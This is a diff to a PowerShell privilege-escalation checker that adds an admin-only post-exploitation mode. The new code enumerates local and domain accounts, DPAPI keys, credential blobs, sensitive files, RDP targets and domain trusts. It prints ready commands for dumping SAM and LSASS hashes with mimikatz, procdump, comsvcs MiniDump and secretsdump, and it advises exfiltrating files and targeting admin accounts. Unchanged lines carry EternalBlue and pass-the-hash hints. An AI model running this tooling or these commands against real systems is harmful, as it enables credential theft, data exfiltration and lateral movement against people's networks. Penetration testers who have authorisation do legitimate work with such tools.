@@ -10,9 +10,10 @@
     Version: 3.0
     Run    : powershell -ep bypass -f WinPrivEsc-Checker.ps1
              powershell -ep bypass -f WinPrivEsc-Checker.ps1 -Extended
+             powershell -ep bypass -f WinPrivEsc-Checker.ps1 -Admin
 #>
 
-param([switch]$Extended)
+param([switch]$Extended, [switch]$Admin)
 
 $ErrorActionPreference = 'SilentlyContinue'
 
@@ -176,6 +177,14 @@ $princ  = New-Object Security.Principal.WindowsPrincipal($me)
 $isAdm  = $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $myName = $me.Name
 
+if ($Admin) {
+    Write-Host ""
+    Write-Host "  ╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
+    Write-Host "  ║  ADMIN MODE — post-exploitation enumeration                 ║" -ForegroundColor Magenta
+    Write-Host "  ║  Skipping privesc checks, focusing on loot & lateral paths  ║" -ForegroundColor Magenta
+    Write-Host "  ╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Magenta
+}
+
 # ════════════════════════════════════════════════════════════════
 #  §0  ORIENTATION
 # ════════════════════════════════════════════════════════════════
@@ -241,6 +250,7 @@ whoami /groups /fo csv 2>$null | ConvertFrom-Csv | %{
 #  §0.5  TOKEN PRIVILEGES
 # ════════════════════════════════════════════════════════════════
 
+if (-not $Admin) {
 hdr "§0.5 - TOKEN PRIVILEGES (whoami /priv)"
 
 $dangerousPrivs = @{
@@ -279,6 +289,8 @@ if ($privLines) {
         }
     }
 }
+
+} # end if (-not $Admin) — §0.5 Token Privileges
 
 # ════════════════════════════════════════════════════════════════
 #  §1  FREE CREDENTIAL WINS
@@ -641,8 +653,10 @@ if ($Extended) {
 }
 
 # ════════════════════════════════════════════════════════════════
-#  §3  UAC CONFIGURATION
+#  §3–§8  PRIVESC CHECKS (skipped in -Admin mode)
 # ════════════════════════════════════════════════════════════════
+
+if (-not $Admin) {
 
 hdr "§3 - UAC CONFIGURATION"
 
@@ -1105,6 +1119,8 @@ foreach ($dir in $startupDirs) {
     }
 }
 
+} # end if (-not $Admin) — §3–§8 privesc checks
+
 # ════════════════════════════════════════════════════════════════
 #  §9  NETWORK
 # ════════════════════════════════════════════════════════════════
@@ -1203,6 +1219,7 @@ if ($clm -ne 'FullLanguage') {
 #  §11  KERNEL / CVE CHECKS
 # ════════════════════════════════════════════════════════════════
 
+if (-not $Admin) {
 hdr "§11 - KERNEL / CVE CHECKS (last resort)"
 
 sub "Patch level"
@@ -1254,6 +1271,8 @@ if (-not $eb -and $build -lt 15063) {
     finding 'HIGH' "Potentially vulnerable to MS17-010 (EternalBlue)" "No known patch KB found, build < RS2" `
         "nmap --script smb-vuln-ms17-010 -p445 <target>`nOr: msfconsole -> exploit/windows/smb/ms17_010_eternalblue"
 }
+
+} # end if (-not $Admin) — §11 Kernel/CVE
 
 # ════════════════════════════════════════════════════════════════
 #  §12  MISCELLANEOUS + DOMAIN
@@ -1413,6 +1432,293 @@ if (($laps -and $laps.AdmPwdEnabled -eq 1) -or $lapsNew) {
     finding 'LOW' "LAPS not installed - local admin password may be reused" $null `
         "If you get local admin hash: crackmapexec smb <subnet>/24 -u Administrator -H <hash>"
 }
+
+# ════════════════════════════════════════════════════════════════
+#  §13  ADMIN-MODE EXTRAS (only with -Admin)
+# ════════════════════════════════════════════════════════════════
+
+if ($Admin) {
+
+hdr "§13 - ADMIN POST-EXPLOITATION EXTRAS"
+
+# --- All local users with details ---
+sub "All local users (detailed)"
+Get-LocalUser 2>$null | ForEach-Object {
+    $u = $_
+    $groups = @()
+    try { $groups = @(Get-LocalGroup 2>$null | ForEach-Object { $g = $_; Get-LocalGroupMember $g -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "\\$($u.Name)$" } | ForEach-Object { $g.Name } }) } catch {}
+    $pwAge = if ($u.PasswordLastSet) { "$((New-TimeSpan $u.PasswordLastSet (Get-Date)).Days) days ago ($($u.PasswordLastSet.ToString('yyyy-MM-dd')))" } else { 'never set' }
+    $lastLogon = if ($u.LastLogon) { $u.LastLogon.ToString('yyyy-MM-dd HH:mm') } else { 'never' }
+    $detail = "Enabled: $($u.Enabled) | PwdLastSet: $pwAge | LastLogon: $lastLogon"
+    if ($groups) { $detail += "`nGroups: $($groups -join ', ')" }
+    if ($u.Description) { $detail += "`nDescription: $($u.Description)" }
+    $sev = if ($u.Description -match '(?i)(pass|pwd|wachtwoord|cred|secret|key|login)') { 'HIGH' } else { 'LOW' }
+    finding $sev "User: $($u.Name)" $detail
+}
+
+# --- SAM + SYSTEM dump (we are admin, we can do this) ---
+sub "Dump SAM/SYSTEM (admin = you can do this now)"
+finding 'HIGH' "You are admin — dump SAM hashes" `
+    "Use reg save or mimikatz to extract local hashes" `
+    "reg save HKLM\SAM sam.bak`nreg save HKLM\SYSTEM sys.bak`nsecretsdump.py -sam sam.bak -system sys.bak LOCAL`nOr: mimikatz # lsadump::sam"
+
+# --- LSASS dump reminder ---
+sub "LSASS dump (admin = you can do this now)"
+finding 'HIGH' "You are admin — dump LSASS for domain creds" `
+    "Active logon sessions may contain cleartext or NTLM creds" `
+    "procdump.exe -accepteula -ma lsass.exe lsass.dmp`ntasklist /fi `"imagename eq lsass.exe`"`nOr: mimikatz # sekurlsa::logonpasswords`nOr: comsvcs.dll MiniDump: rundll32 comsvcs.dll MiniDump <lsass_pid> lsass.dmp full"
+
+# --- DPAPI master keys (admin can decrypt all) ---
+sub "DPAPI master keys (all users)"
+$dpapiUsers = Get-ChildItem 'C:\Users' -Directory -Force 2>$null
+foreach ($du in $dpapiUsers) {
+    $mkDir = Join-Path $du.FullName 'AppData\Roaming\Microsoft\Protect'
+    if (Test-Path $mkDir) {
+        $sidDirs = Get-ChildItem $mkDir -Directory -Force 2>$null
+        foreach ($sd in $sidDirs) {
+            $mkCount = @(Get-ChildItem $sd.FullName -Force 2>$null | Where-Object { $_.Name -match '^[0-9a-f-]{36}$' }).Count
+            if ($mkCount -gt 0) {
+                finding 'HIGH' "DPAPI master keys [$($du.Name)]: $mkCount key(s) in $($sd.FullName)" `
+                    "As admin, decrypt with domain backup key or user password" `
+                    "mimikatz # dpapi::masterkey /in:`"$($sd.FullName)\<guid>`" /rpc`nSharpDPAPI.exe masterkeys"
+            }
+        }
+    }
+    # Credential blobs per user
+    $credDir = Join-Path $du.FullName 'AppData\Roaming\Microsoft\Credentials'
+    if (Test-Path $credDir) {
+        $blobs = @(Get-ChildItem $credDir -Force 2>$null)
+        if ($blobs.Count -gt 0) {
+            finding 'HIGH' "DPAPI credential blobs [$($du.Name)]: $($blobs.Count) blob(s)" `
+                "Path: $credDir" `
+                "mimikatz # dpapi::cred /in:`"$credDir\<file>`"`nSharpDPAPI.exe credentials"
+        }
+    }
+}
+
+# --- Interesting files across all user profiles ---
+sub "Interesting files in all user profiles"
+$interestingExts = '*.kdbx','*.rdp','*.ppk','*.pem','*.key','*.pfx','*.p12','*.id_rsa','*.ovpn','*.pcap','*.cap','*.dmp','*.bak','*.sql','*.mdb','*.accdb','*.sln','*.config','*.ini','*.xml','*.json','*.yml','*.yaml','*.env','*.htpasswd'
+$userHomes = Get-ChildItem 'C:\Users' -Directory -Force 2>$null
+foreach ($uh in $userHomes) {
+    $found = @()
+    foreach ($ext in $interestingExts) {
+        Get-ChildItem "$($uh.FullName)\*" -Include $ext -Recurse -Force -ErrorAction SilentlyContinue |
+            Where-Object { $_.Length -gt 0 -and $_.FullName -notmatch '\\(AppData\\Local\\(Microsoft|Google|Packages|Temp)|\.nuget|node_modules)\\' } |
+            Select-Object -First 3 | ForEach-Object { $found += $_ }
+    }
+    if ($found.Count -gt 0) {
+        $detail = ($found | ForEach-Object { "$($_.FullName) ($([math]::Round($_.Length/1KB,1)) KB)" }) -join "`n"
+        finding 'HIGH' "Interesting files in $($uh.Name) profile ($($found.Count) found)" $detail `
+            "Review and exfiltrate relevant files"
+    }
+}
+
+# --- Non-default files in common dirs ---
+sub "Non-default files in root and common dirs"
+@('C:\','C:\Temp','C:\Backups','C:\Scripts','C:\Shares','C:\inetpub','C:\Tools','C:\Dev','C:\Data') | ForEach-Object {
+    if (-not (Test-Path $_)) { return }
+    $items = Get-ChildItem $_ -Force -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -notmatch '^(\$Recycle\.Bin|Documents and Settings|PerfLogs|Program Files|Program Files \(x86\)|ProgramData|Recovery|System Volume Information|Users|Windows|windows\.old|bootmgr|pagefile\.sys|swapfile\.sys|hiberfil\.sys|desktop\.ini|DumpStack\.log\.tmp|BOOTNXT)$' }
+    foreach ($item in $items) {
+        $label = if ($item.PSIsContainer) { "[DIR] $($item.FullName)" } else { "$($item.FullName) ($([math]::Round($item.Length/1KB,1)) KB)" }
+        finding 'MED' "Non-default: $label"
+    }
+}
+
+# --- Scheduled tasks owned by non-system accounts ---
+sub "Scheduled tasks by non-system accounts"
+try {
+    schtasks /query /fo CSV /v 2>$null | ConvertFrom-Csv -ErrorAction Stop |
+        Where-Object { $_.'Run As User' -and $_.'Run As User' -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE|N/A|Everyone|Users|Administrators' } |
+        Select-Object -Property TaskName,'Run As User','Task To Run','Schedule Type','Next Run Time' -Unique |
+        ForEach-Object {
+            finding 'MED' "Task by $($_.'Run As User'): $($_.'TaskName')" `
+                "Runs: $($_.'Task To Run')`nSchedule: $($_.'Schedule Type') Next: $($_.'Next Run Time')" `
+                "Check if this reveals service accounts or cred patterns"
+        }
+} catch {}
+
+# --- Logged-on / recent sessions ---
+sub "Logged-on and recent user sessions"
+try {
+    $logonSessions = Get-CimInstance Win32_LogonSession -ErrorAction Stop | Where-Object { $_.LogonType -in @(2,3,7,10,11) }
+    foreach ($sess in $logonSessions) {
+        $user = Get-CimAssociatedInstance $sess -ResultClassName Win32_UserAccount -ErrorAction SilentlyContinue
+        $logonTypeMap = @{2='Interactive';3='Network';7='Unlock';10='RDP';11='CachedInteractive'}
+        $lt = $logonTypeMap[[int]$sess.LogonType]
+        if (-not $lt) { $lt = "Type $($sess.LogonType)" }
+        $startTime = if ($sess.StartTime) { $sess.StartTime.ToString('yyyy-MM-dd HH:mm') } else { '?' }
+        $uName = if ($user) { "$($user.Domain)\$($user.Name)" } else { '(unknown)' }
+        finding 'MED' "Session: $uName [$lt] since $startTime"
+    }
+} catch {
+    # Fallback: query user
+    $qu = query user 2>$null | Out-String
+    if ($qu -and $qu.Trim().Length -gt 0) {
+        $qu -split "`n" | Where-Object { $_ -match '\S' } | ForEach-Object { Write-Host "    $($_.Trim())" -ForegroundColor Gray }
+    }
+}
+
+# --- RDP saved connections (all users) ---
+sub "RDP saved connections (all users registry)"
+$userSIDs = Get-ChildItem 'Registry::HKEY_USERS' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-' -and $_.Name -notmatch '_Classes$' }
+foreach ($sid in $userSIDs) {
+    $rdpKey = "Registry::$($sid.Name)\Software\Microsoft\Terminal Server Client\Servers"
+    $servers = Get-ChildItem $rdpKey -ErrorAction SilentlyContinue
+    foreach ($srv in $servers) {
+        $hint = (Get-ItemProperty $srv.PSPath -ErrorAction SilentlyContinue).UsernameHint
+        finding 'HIGH' "RDP connection [$($sid.PSChildName)]: $($srv.PSChildName)" `
+            "Username hint: $hint" `
+            "Target for lateral movement with current creds"
+    }
+}
+
+# --- Recently run programs (UserAssist, all users) ---
+sub "Recently run programs (UserAssist)"
+foreach ($sid in $userSIDs) {
+    $uaKey = "Registry::$($sid.Name)\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+    Get-ChildItem $uaKey -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+        $_.GetValueNames() | Where-Object { $_ -match '\\[^\\]+\.(exe|bat|cmd|ps1|msi|msc|cpl)$' -or ($_ -match '^[A-Za-z]' -and $_ -match '\.(exe|bat|cmd|ps1)') } | ForEach-Object {
+            # ROT13 decode the value name
+            $decoded = -join ($_.ToCharArray() | ForEach-Object {
+                $c = $_
+                if ($c -ge 'A' -and $c -le 'Z') { [char]((([int]$c - 65 + 13) % 26) + 65) }
+                elseif ($c -ge 'a' -and $c -le 'z') { [char]((([int]$c - 97 + 13) % 26) + 97) }
+                else { $c }
+            })
+            if ($decoded -match '\\[^\\]+\.(exe|bat|cmd|ps1|msi)$' -and $decoded -notmatch '\\(Windows|Microsoft|System32)\\') {
+                Write-Host "    $decoded" -ForegroundColor Gray
+            }
+        }
+    }
+}
+
+# --- Domain: Group Memberships of key groups ---
+if ($cs.PartOfDomain) {
+    sub "Domain Admins, Enterprise Admins, Schema Admins members"
+    foreach ($grpName in @('Domain Admins','Enterprise Admins','Schema Admins','Account Operators','Server Operators','Backup Operators')) {
+        try {
+            $searcher = New-Object DirectoryServices.DirectorySearcher
+            $searcher.Filter = "(&(objectCategory=group)(cn=$grpName))"
+            $searcher.PropertiesToLoad.Add('member') | Out-Null
+            $grpResult = $searcher.FindOne()
+            if ($grpResult -and $grpResult.Properties['member'].Count -gt 0) {
+                $members = $grpResult.Properties['member'] | ForEach-Object {
+                    if ($_ -match 'CN=([^,]+)') { $Matches[1] } else { $_ }
+                }
+                finding 'HIGH' "$grpName members ($($members.Count))" ($members -join "`n") `
+                    "Target these accounts for credential extraction"
+            }
+        } catch {}
+    }
+
+    # --- Domain: All user accounts with password info ---
+    sub "Domain users - password ages and account status"
+    try {
+        $searcher = New-Object DirectoryServices.DirectorySearcher
+        $searcher.Filter = '(&(objectCategory=person)(objectClass=user))'
+        $searcher.PropertiesToLoad.AddRange(@('samaccountname','pwdlastset','lastlogontimestamp','useraccountcontrol','admincount','description'))
+        $searcher.PageSize = 500
+        $domUsers = $searcher.FindAll()
+        $now = Get-Date
+        foreach ($du in $domUsers) {
+            $sam = $du.Properties['samaccountname'][0]
+            $uac = [int]$du.Properties['useraccountcontrol'][0]
+            $disabled = [bool]($uac -band 2)
+            $noExpire = [bool]($uac -band 65536)
+            $noPreAuth = [bool]($uac -band 4194304)
+            $isAdmin = $du.Properties['admincount'] -contains 1
+            $desc = if ($du.Properties['description'].Count -gt 0) { $du.Properties['description'][0] } else { $null }
+            $pwdSet = if ($du.Properties['pwdlastset'][0] -and [long]$du.Properties['pwdlastset'][0] -gt 0) {
+                $d = [datetime]::FromFileTime([long]$du.Properties['pwdlastset'][0])
+                "$((New-TimeSpan $d $now).Days)d ($($d.ToString('yyyy-MM-dd')))"
+            } else { 'never' }
+            $lastLogon = if ($du.Properties['lastlogontimestamp'].Count -gt 0 -and [long]$du.Properties['lastlogontimestamp'][0] -gt 0) {
+                [datetime]::FromFileTime([long]$du.Properties['lastlogontimestamp'][0]).ToString('yyyy-MM-dd')
+            } else { 'never' }
+
+            $flags = @()
+            if ($isAdmin) { $flags += 'ADMIN' }
+            if ($disabled) { $flags += 'disabled' }
+            if ($noExpire) { $flags += 'pwd-never-expires' }
+            if ($noPreAuth) { $flags += 'NO-PREAUTH' }
+            $flagStr = if ($flags) { " [$($flags -join ', ')]" } else { '' }
+
+            $detail = "PwdAge: $pwdSet | LastLogon: $lastLogon$flagStr"
+            if ($desc) { $detail += "`nDescription: $desc" }
+
+            $sev = 'LOW'
+            if ($isAdmin -or $noPreAuth) { $sev = 'HIGH' }
+            if ($desc -match '(?i)(pass|pwd|wachtwoord|cred|secret|key|login)') { $sev = 'HIGH' }
+            finding $sev "$sam$flagStr" $detail
+        }
+    } catch {
+        finding 'MED' "Could not enumerate domain users via LDAP" $null `
+            "net user /domain`nOr: Get-ADUser -Filter * -Properties *"
+    }
+
+    # --- Domain: Computers ---
+    sub "Domain computers"
+    try {
+        $searcher = New-Object DirectoryServices.DirectorySearcher
+        $searcher.Filter = '(objectCategory=computer)'
+        $searcher.PropertiesToLoad.AddRange(@('samaccountname','dnshostname','operatingsystem','lastlogontimestamp'))
+        $searcher.PageSize = 500
+        $domComputers = $searcher.FindAll()
+        foreach ($dc in $domComputers) {
+            $name = $dc.Properties['dnshostname']
+            $os = $dc.Properties['operatingsystem']
+            $ll = if ($dc.Properties['lastlogontimestamp'].Count -gt 0 -and [long]$dc.Properties['lastlogontimestamp'][0] -gt 0) {
+                [datetime]::FromFileTime([long]$dc.Properties['lastlogontimestamp'][0]).ToString('yyyy-MM-dd')
+            } else { 'never' }
+            Write-Host "    $name | $os | LastLogon: $ll" -ForegroundColor Gray
+        }
+    } catch {}
+
+    # --- Domain: GPO names ---
+    sub "Group Policy Objects"
+    try {
+        $searcher = New-Object DirectoryServices.DirectorySearcher
+        $searcher.Filter = '(objectCategory=groupPolicyContainer)'
+        $searcher.PropertiesToLoad.AddRange(@('displayname','gpcfilesyspath'))
+        $gpos = $searcher.FindAll()
+        foreach ($gpo in $gpos) {
+            $gpoName = $gpo.Properties['displayname'][0]
+            $gpoPath = $gpo.Properties['gpcfilesyspath'][0]
+            Write-Host "    $gpoName -> $gpoPath" -ForegroundColor Gray
+        }
+    } catch {}
+
+    # --- Domain: DNS zones (find other hosts) ---
+    sub "AD-integrated DNS zones"
+    try {
+        $searcher = New-Object DirectoryServices.DirectorySearcher
+        $searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry("LDAP://CN=MicrosoftDNS,DC=DomainDnsZones,$((New-Object DirectoryServices.DirectoryEntry).distinguishedName)")
+        $searcher.Filter = '(objectClass=dnsZone)'
+        $searcher.PropertiesToLoad.Add('name') | Out-Null
+        $zones = $searcher.FindAll()
+        foreach ($z in $zones) {
+            Write-Host "    DNS zone: $($z.Properties['name'][0])" -ForegroundColor Gray
+        }
+    } catch {}
+
+    # --- Domain: Trust relationships ---
+    sub "Domain trusts"
+    try {
+        $searcher = New-Object DirectoryServices.DirectorySearcher
+        $searcher.Filter = '(objectClass=trustedDomain)'
+        $searcher.PropertiesToLoad.AddRange(@('cn','trustdirection','trusttype'))
+        $trusts = $searcher.FindAll()
+        foreach ($t in $trusts) {
+            $dir = switch ([int]$t.Properties['trustdirection'][0]) { 1 {'Inbound'} 2 {'Outbound'} 3 {'Bidirectional'} default {'Unknown'} }
+            finding 'HIGH' "Domain trust: $($t.Properties['cn'][0]) ($dir)" $null `
+                "Enumerate the trusted domain for lateral movement"
+        }
+    } catch {}
+}
+
+} # end if ($Admin)
 
 # ════════════════════════════════════════════════════════════════
 #  SUMMARY
